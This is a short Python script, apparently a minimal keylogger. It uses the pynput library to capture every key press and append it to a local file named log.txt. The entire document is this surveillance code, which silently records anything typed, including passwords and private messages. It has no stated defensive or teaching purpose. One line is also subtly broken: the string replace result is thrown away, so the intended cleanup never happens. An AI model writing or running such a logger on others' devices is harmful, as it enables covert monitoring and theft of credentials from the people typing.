from pynput.keyboard import Listener

def save_to_file(key):
    keydata=str(key)
    keydata.replace("'"," ")
    with open('log.txt','a') as f:
        f.write(keydata)


with Listener(on_press=save_to_file) as l:
    l.join()

